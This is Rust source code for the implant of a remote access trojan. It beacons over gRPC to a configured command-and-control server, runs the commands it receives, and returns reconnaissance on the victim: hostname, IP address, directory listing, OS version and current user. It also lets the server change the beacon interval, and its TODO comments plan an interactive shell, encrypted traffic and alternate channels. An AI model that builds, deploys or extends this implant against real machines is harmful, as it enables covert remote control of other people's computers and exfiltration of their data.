use remote_access_trojan::rat::{Beacon, CommandResponse};
use remote_access_trojan::rat::ask_for_instructions_client::AskForInstructionsClient;
use remote_access_trojan::rat::RatCommand;
use remote_access_trojan::rat::record_command_result_client::RecordCommandResultClient;
use std::collections::hash_map::DefaultHasher;
use std::hash::{Hash, Hasher};
use std::process::Command;
use std::{mem, thread};
use std::time::{Duration, SystemTime};
use tonic::transport::Endpoint;

/*
TODO
    - implant 'shell' command
    - encrypt traffic from implant to server
    - alternate communication method(s) between implant and server
*/

// Return the hostname as a string
fn get_hostname() -> String {
    let hostname = Command::new("hostname")
                            .output()
                            .unwrap();
    let hostname = String::from_utf8(hostname.stdout).unwrap();
    let hostname = hostname.trim();
    hostname.to_string()
}

// Return the IP address of the victim as a string - Linux
#[cfg(target_os = "linux")]
fn get_ip_address() -> String {
    let ip_address = Command::new("hostname")
                            .arg("-I")
                            .output()
                            .unwrap();
    let ip_address = String::from_utf8(ip_address.stdout).unwrap();
    let ip_address = ip_address.trim();
    ip_address.to_string()
}

// Return the IP address of the victim as a string - Windows
#[cfg(windows)]
fn get_ip_address() -> String {
    let ip_address = Command::new("ipconfig")
                            .arg("|")
                            .arg("findstr")
                            .arg("IPv4")
                            .output()
                            .unwrap();
    let ip_address = String::from_utf8(ip_address.stdout).unwrap();
    let ip_address: Vec<&str> = ip_address.split(':').collect();
    let ip_address = ip_address[1].trim();
    ip_address.to_string()
}

// Return the current directory listing as a string - Linux
#[cfg(target_os = "linux")]
fn get_directory_listing() -> String {
    let directory = Command::new("ls")
                            .output()
                            .unwrap();
    let directory = String::from_utf8(directory.stdout).unwrap();
    let directory = directory.trim();
    directory.to_string()
}

// Return the current directory listing as a string - Windows
#[cfg(windows)]
fn get_directory_listing() -> String {
    let directory = Command::new("dir")
                            .output()
                            .unwrap();
    let directory = String::from_utf8(directory.stdout).unwrap();
    let directory = directory.trim();
    directory.to_string()
}

// Return the operating system of the victim as a string - Linux
#[cfg(target_os = "linux")]
fn get_operating_system() -> String {
    let os = Command::new("cat")
                    .arg("/proc/version")
                    .output()
                    .unwrap();
    let os = String::from_utf8(os.stdout).unwrap();
    let os = os.trim();
    os.to_string()
}

// Return the operating system of the victim as a string - Windows
#[cfg(windows)]
fn get_operating_system() -> String {
    let os = Command::new("systeminfo")
                    .arg("|")
                    .arg("findstr")
                    .arg("OS ")
                    .output()
                    .unwrap();
    let os = String::from_utf8(os.stdout).unwrap();
    let os = os.trim();
    os.to_string()
}

// Return the user compromised on the victim as a string
fn get_username() -> String {
    let username = Command::new("whoami")
                            .output()
                            .unwrap();
    let username = String::from_utf8(username.stdout).unwrap();
    let username = username.trim();
    username.to_string()
}

// Hash a thing and return the value as a u64
fn calculate_hash<T: Hash>(t: &T) -> u64 {
    let mut s = DefaultHasher::new();
    t.hash(&mut s);
    s.finish()
}

// Generate an implant ID, which is the hashed value of {hostname}:{ip_address} formatted as a hex string
fn generate_implant_id() -> String {
    let hostname = get_hostname();
    let ip_address = get_ip_address();

    let hashed_value = calculate_hash(&format!("{hostname}:{ip_address}"));
    format!("{hashed_value:x}")
}

struct ImplantState {
    implant_id: String,
    cadence: Duration,
    server_location: String,
    server_port: u16,
    command_number: u32
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    // Initialize state
    let mut state = ImplantState {
        implant_id: generate_implant_id(),
        cadence: Duration::from_millis(10000),
        server_location: String::from(rco_config::RAT_SERVER_LOCATION),
        server_port: rco_config::RAT_SERVER_PORT,
        command_number: 0
    };
    
    loop {
        // Set up connection to server
        let location = state.server_location.clone();
        let port = state.server_port;
        let socket = format!("http://{location}:{port}");
        let channel = Endpoint::from_shared(socket.clone())?
                        .connect()
                        .await?;
        // Prepare a client for beaconing
        let mut ask_client = AskForInstructionsClient::new(channel.clone());
        // Prepare a client for sending back command results
        let mut response_client = RecordCommandResultClient::new(channel.clone());
        // Request the next command
        let request = tonic::Request::new(
            Beacon {
                requested_command: state.command_number
            },
        );
        // Parse the response from the server
        let response = ask_client.send(request).await?.into_inner();
        let command = RatCommand::from_i32(response.command).unwrap();
        // Run the applicable command
        let command_result = match command {
            RatCommand::Cadence => {
                state.command_number += 1;
                let seconds = response.arguments.parse::<u64>()?;
                state.cadence = Duration::from_millis(seconds * 1000);
                "Beacon cadence changed".to_string()
            },
            RatCommand::Dir => {
                state.command_number += 1;
                get_directory_listing()
            },
            RatCommand::Hostname => {
                state.command_number += 1;
                get_hostname()
            },
            RatCommand::Ip => {
                state.command_number += 1;
                get_ip_address()
            },
            RatCommand::Ls => {
                state.command_number += 1;
                get_directory_listing()
            },
            // The server does not have any commands to run that the implant has not already run
            RatCommand::None => {
                mem::drop(channel);
                mem::drop(ask_client);
                mem::drop(response_client);
                thread::sleep(state.cadence);
                continue
            },
            RatCommand::Os => {
                state.command_number += 1;
                get_operating_system()
            },
            RatCommand::Quit => {
                state.command_number += 1;
                break
            },
            RatCommand::Shell => {
                state.command_number += 1;
                "PLACEHOLDER".to_string()
            },
            RatCommand::Whoami => {
                state.command_number += 1;
                get_username()
            }
        };
        // Format the response to the server
        let result = tonic::Request::new(
            CommandResponse {
                implant_id: state.implant_id.clone(),
                timestamp: SystemTime::now().duration_since(SystemTime::UNIX_EPOCH)?.as_secs(),
                command: response.command,
                arguments: response.arguments,
                result: command_result
            },
        );
        // Send the response to the server
        response_client.send(result).await?;
        // By dropping these I can prevent having an always-established TCP session
        mem::drop(channel);
        mem::drop(ask_client);
        mem::drop(response_client);
        // Sleep until it is time to beacon again
        thread::sleep(state.cadence);
    }

    Ok(())
}